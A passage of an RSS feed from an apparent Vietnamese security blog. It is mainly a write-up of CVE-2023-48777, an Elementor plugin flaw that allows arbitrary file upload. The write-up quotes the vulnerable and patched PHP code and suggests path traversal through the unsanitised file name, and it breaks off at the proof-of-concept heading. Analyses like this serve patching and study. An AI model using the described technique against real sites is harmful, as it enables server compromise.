chu·ªói base64 tr·∫£ v·ªÅ:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/base64_return.png&#34; title=&#34;Chu·ªói base64 tr·∫£ v·ªÅ&#34; data-thumbnail=&#34;/posts/2025-11-11-pop-chain-lab1/base64_return.png&#34; data-sub-html=&#34;&lt;h2&gt;Base64&lt;/h2&gt;&lt;p&gt;Chu·ªói base64 tr·∫£ v·ªÅ&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/base64_return.png&#39; alt=&#34;Base64&#34; height=&#34;450&#34; width=&#34;1542&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Chu·ªói base64 tr·∫£ v·ªÅ&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;G·ª≠i request theo c√∫ ph√°p challenge&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/result.png&#34; title=&#34;RCE th√†nh c√¥ng&#34; data-thumbnail=&#34;/posts/2025-11-11-pop-chain-lab1/result.png&#34; data-sub-html=&#34;&lt;h2&gt;RCE&lt;/h2&gt;&lt;p&gt;RCE th√†nh c√¥ng&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/result.png&#39; alt=&#34;RCE&#34; height=&#34;593&#34; width=&#34;1542&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE th√†nh c√¥ng&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2023-48777 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-10-cve-2023-48777/</link>
      <pubDate>Mon, 10 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-10-cve-2023-48777/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; trong &lt;strong&gt;Elementor Website Builder&lt;/strong&gt; plugin cho WordPress. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;Elementor Website Builder&lt;/strong&gt;: t·ª´ phi√™n b·∫£n &lt;strong&gt;3.3.0&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;3.18.1&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-48777&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2023-48777&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.3.0-3.18.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.18.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Elementor Website Builder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Elementor Website Builder&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.3.0&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.18.2&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng xu·∫•t ph√°t t·ª´ vi·ªác &lt;strong&gt;kh√¥ng ki·ªÉm tra lo·∫°i file (file type)&lt;/strong&gt; h·ª£p l·ªá tr∆∞·ªõc khi l∆∞u tr·ªØ l√™n &lt;strong&gt;server&lt;/strong&gt;, cho ph√©p k·∫ª t·∫•n c√¥ng t·∫£i l√™n c√°c file c√≥ ƒë·ªãnh d·∫°ng nguy hi·ªÉm.&lt;/p&gt;&#xA;&lt;p&gt;Trong phi√™n b·∫£n &lt;strong&gt;3.18.1&lt;/strong&gt;, h√†m &lt;code&gt;handle_elementor_upload()&lt;/code&gt; kh√¥ng th·ª±c hi·ªán x√°c minh &lt;code&gt;file type&lt;/code&gt; khi x·ª≠ l√Ω d·ªØ li·ªáu t·∫£i l√™n t·ª´ tham s·ªë &lt;code&gt;fileData&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) {&#xA;    if ( isset( $file[&amp;#39;fileData&amp;#39;] ) ) {&#xA;        $file = $this-&amp;gt;save_base64_to_tmp_file( $file );&#xA;    }&#xA;&#xA;    $validation_result = $this-&amp;gt;validate_file( $file, $allowed_file_extensions );&#xA;&#xA;    if ( is_wp_error( $validation_result ) ) {&#xA;        return $validation_result;&#xA;    }&#xA;&#xA;    return $file;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;private function save_base64_to_tmp_file( $file ) {&#xA;    $file_content = base64_decode( $file[&amp;#39;fileData&amp;#39;] ); // phpcs:ignore&#xA;&#xA;    // If the decode fails&#xA;    if ( ! $file_content ) {&#xA;        return new \WP_Error( &amp;#39;file_error&amp;#39;, self::INVALID_FILE_CONTENT );&#xA;    }&#xA;&#xA;    $temp_filename = $this-&amp;gt;create_temp_file( $file_content, $file[&amp;#39;fileName&amp;#39;] );&#xA;&#xA;    if ( is_wp_error( $temp_filename ) ) {&#xA;        return $temp_filename;&#xA;    }&#xA;&#xA;    return [&#xA;        // the original uploaded file name&#xA;        &amp;#39;name&amp;#39; =&amp;gt; $file[&amp;#39;fileName&amp;#39;],&#xA;        // The path to the temporary file&#xA;        &amp;#39;tmp_name&amp;#39; =&amp;gt; $temp_filename,&#xA;    ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong b·∫£n v√° &lt;strong&gt;3.18.2&lt;/strong&gt;, nh√† ph√°t tri·ªÉn ƒë√£ &lt;strong&gt;b·ªï sung ki·ªÉm tra lo·∫°i file h·ª£p l·ªá&lt;/strong&gt; tr∆∞·ªõc khi l∆∞u tr·ªØ b·∫±ng c√°ch truy·ªÅn th√™m tham s·ªë &lt;code&gt;$allowed_file_extensions&lt;/code&gt; v√†o h√†m &lt;code&gt;save_base64_to_tmp_file()&lt;/code&gt;, nh·∫±m ngƒÉn ch·∫∑n vi·ªác t·∫£i l√™n c√°c file ƒë·ªôc h·∫°i:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) {&#xA;    if ( isset( $file[&amp;#39;fileData&amp;#39;] ) ) {&#xA;        $file = $this-&amp;gt;save_base64_to_tmp_file( $file, $allowed_file_extensions );&#xA;    }&#xA;&#xA;    $validation_result = $this-&amp;gt;validate_file( $file, $allowed_file_extensions );&#xA;&#xA;    if ( is_wp_error( $validation_result ) ) {&#xA;        return $validation_result;&#xA;    }&#xA;&#xA;    return $file;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;private function save_base64_to_tmp_file( $file, $allowed_file_extensions = null ) {&#xA;    $file_extension = pathinfo( $file[&amp;#39;fileName&amp;#39;], PATHINFO_EXTENSION );&#xA;    $is_file_type_allowed = $this-&amp;gt;is_file_type_allowed( $file_extension, $allowed_file_extensions );&#xA;&#xA;    if ( is_wp_error( $is_file_type_allowed ) ) {&#xA;        return $is_file_type_allowed;&#xA;    }&#xA;&#xA;    $file_content = base64_decode( $file[&amp;#39;fileData&amp;#39;] ); // phpcs:ignore&#xA;&#xA;    // If the decode fails&#xA;    if ( ! $file_content ) {&#xA;        return new \WP_Error( &amp;#39;file_error&amp;#39;, self::INVALID_FILE_CONTENT );&#xA;    }&#xA;&#xA;    $temp_filename = $this-&amp;gt;create_temp_file( $file_content, $file[&amp;#39;fileName&amp;#39;] );&#xA;&#xA;    if ( is_wp_error( $temp_filename ) ) {&#xA;        return $temp_filename;&#xA;    }&#xA;&#xA;    return [&#xA;        // the original uploaded file name&#xA;        &amp;#39;name&amp;#39; =&amp;gt; $file[&amp;#39;fileName&amp;#39;],&#xA;        // The path to the temporary file&#xA;        &amp;#39;tmp_name&amp;#39; =&amp;gt; $temp_filename,&#xA;    ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Qu√° tr√¨nh upload &lt;strong&gt;template&lt;/strong&gt; c√≥ n·ªôi dung ·ªü d·∫°ng &lt;strong&gt;Base64&lt;/strong&gt; ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ sau: d·ªØ li·ªáu trong &lt;code&gt;$file[&#39;fileData&#39;]&lt;/code&gt; ƒë∆∞·ª£c &lt;strong&gt;gi·∫£i m√£ b·∫±ng&lt;/strong&gt; &lt;code&gt;base64_decode&lt;/code&gt; v√† g√°n v√†o bi·∫øn &lt;code&gt;$file_content&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$file_content = base64_decode( $file[&amp;#39;fileData&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi gi·∫£i m√£, h√†m &lt;code&gt;save_base64_to_tmp_file()&lt;/code&gt; s·∫Ω &lt;strong&gt;g·ªçi ƒë·∫øn&lt;/strong&gt; &lt;code&gt;create_temp_file()&lt;/code&gt; ƒë·ªÉ &lt;strong&gt;l∆∞u n·ªôi dung n√†y th√†nh file template&lt;/strong&gt; tr√™n server:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function create_temp_file( $file_content, $file_name ) {&#xA;    $temp_filename = $this-&amp;gt;create_unique_dir() . $file_name;&#xA;&#xA;    file_put_contents( $temp_filename, $file_content ); // phpcs:ignore&#xA;&#xA;    return $temp_filename;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê∆∞·ªùng d·∫´n l∆∞u file ƒë∆∞·ª£c t·∫°o b·∫±ng c√°ch n·ªëi &lt;code&gt;$file_name&lt;/code&gt; v·ªõi k·∫øt qu·∫£ tr·∫£ v·ªÅ t·ª´ &lt;code&gt;create_unique_dir()&lt;/code&gt; - h√†m n√†y t·∫°o ƒë∆∞·ªùng d·∫´n l∆∞u tr·ªØ &lt;strong&gt;template t·∫°m th·ªùi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function create_unique_dir() {&#xA;    $unique_dir_path = $this-&amp;gt;get_temp_dir() . uniqid() . DIRECTORY_SEPARATOR;&#xA;&#xA;    wp_mkdir_p( $unique_dir_path );&#xA;&#xA;    return $unique_dir_path;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;create_unique_dir()&lt;/code&gt; ch·ªãu tr√°ch nhi·ªám &lt;strong&gt;t·∫°o th∆∞ m·ª•c ch·ª©a template t·∫°m th·ªùi&lt;/strong&gt;, c√≥ d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp-content/uploads/elementor/tmp/&amp;lt;filename&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong ƒë√≥, &lt;code&gt;&amp;lt;uniqueId&amp;gt;&lt;/code&gt; ƒë∆∞·ª£c sinh t·ª± ƒë·ªông b·∫±ng &lt;a href=&#34;https://www.php.net/manual/en/function.uniqid.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;uniqid()&lt;/a&gt; ƒë·ªÉ ƒë·∫£m b·∫£o ƒë∆∞·ªùng d·∫´n kh√¥ng tr√πng l·∫∑p. &lt;code&gt;wp_mkdir_p()&lt;/code&gt; s·∫Ω t·∫°o th∆∞ m·ª•c v·∫≠t l√Ω tr√™n server ƒë·ªÉ l∆∞u tr·ªØ template n√†y.&lt;/p&gt;&#xA;&lt;p&gt;Cu·ªëi c√πng &lt;code&gt;create_temp_file()&lt;/code&gt; s·∫Ω g·ªçi ƒë·∫øn &lt;code&gt;file_put_contents( $temp_filename, $file_content )&lt;/code&gt; ƒë·ªÉ l∆∞u tr·ªØ n·ªôi dung c·ªßa &lt;code&gt;$file_content&lt;/code&gt; v√†o &lt;code&gt;$temp_filename&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;T·∫≠n d√πng vi·ªác kh√¥ng sanitize file name ·ªü ƒë√¢y, ta k·∫øt h·ª£p t·∫•n c√¥ng path travesal ƒë·ªÉ file ƒë∆∞·ª£c l∆∞u ·ªü v·ªã tr√≠ c√≥ th·ªÉ truy c·∫≠p ƒë∆∞·ª£c, v∆∞·ª£t qua ƒë∆∞·ª£c t√≠nh ch·∫•t ng·∫´u nhi√™n c·ªßa &lt;code&gt;uniqid()&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function import_template( array $data ) {&#xA;    // If the template is a JSON file, allow uploading it.&#xA;    add_filter( &amp;#39;elementor/files/allow-file-type/json&amp;#39;, [ $this, &amp;#39;enable_json_template_upload&amp;#39; ] );&#xA;    add_filter( &amp;#39;elementor/files/allow_unfiltered_upload&amp;#39;, [ $this, &amp;#39;enable_json_template_upload&amp;#39; ] );&#xA;&#xA;    // Imported templates can be either JSON files, or Zip files containing multiple JSON files&#xA;    $upload_result = Plugin::$instance-&amp;gt;uploads_manager-&amp;gt;handle_elementor_upload( $data, [ &amp;#39;zip&amp;#39;, &amp;#39;json&amp;#39; ] );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;handle_elementor_upload()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi trong &lt;code&gt;import_template()&lt;/code&gt;. Theo nh∆∞ comment c·ªßa developer th√¨ n·∫øu template l√† JSON file th√¨ ƒë∆∞·ª£c ph√©p upload, ta ƒë·∫∑t debug v√† th·ª±c hi·ªán upload JSON template:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o post b·∫±ng Elementor&lt;/li&gt;&#xA;&lt;li&gt;Click v√†o folder icon&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/folder_icon.png&#34; title=&#34;V·ªã tr√≠ folder icon&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/folder_icon.png&#34; data-sub-html=&#34;&lt;h2&gt;Folder icon&lt;/h2&gt;&lt;p&gt;V·ªã tr√≠ folder icon&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/folder_icon.png&#39; alt=&#34;Folder icon&#34; height=&#34;1113&#34; width=&#34;1440&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;V·ªã tr√≠ folder icon&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Click v√†o upload icon&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/upload_icon.png&#34; title=&#34;V·ªã tr√≠ upload icon&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/upload_icon.png&#34; data-sub-html=&#34;&lt;h2&gt;Upload icon&lt;/h2&gt;&lt;p&gt;V·ªã tr√≠ upload icon&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/upload_icon.png&#39; alt=&#34;Upload icon&#34; height=&#34;1113&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;V·ªã tr√≠ upload icon&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/upload_board.png&#34; title=&#34;Giao di·ªán upload&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/upload_board.png&#34; data-sub-html=&#34;&lt;h2&gt;Upload board&lt;/h2&gt;&lt;p&gt;Giao di·ªán upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/upload_board.png&#39; alt=&#34;Upload board&#34; height=&#34;818&#34; width=&#34;1309&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giao di·ªán upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Ch·ªçn JSON file v√† upload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/debug.gif&#34; title=&#34;Debuger nh·∫£y t·ªõi import_template sau khi upload JSON file&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/debug.gif&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debuger nh·∫£y t·ªõi import_template sau khi upload JSON file&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/debug.gif&#39; alt=&#34;Debug&#34; height=&#34;1115&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debuger nh·∫£y t·ªõi import_template sau khi upload JSON file&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;User uploads JSON file&amp;#34;] --&amp;gt; B[&amp;#34;import_template()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;handle_elementor_upload()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;save_base64_to_tmp_file()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;create_temp_file()&amp;#34;]&#xA;E --&amp;gt; G[&amp;#34;create_unique_dir()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;file_put_contents()&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;File stored without proper type validation ‚Üí Arbitrary File Upload&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 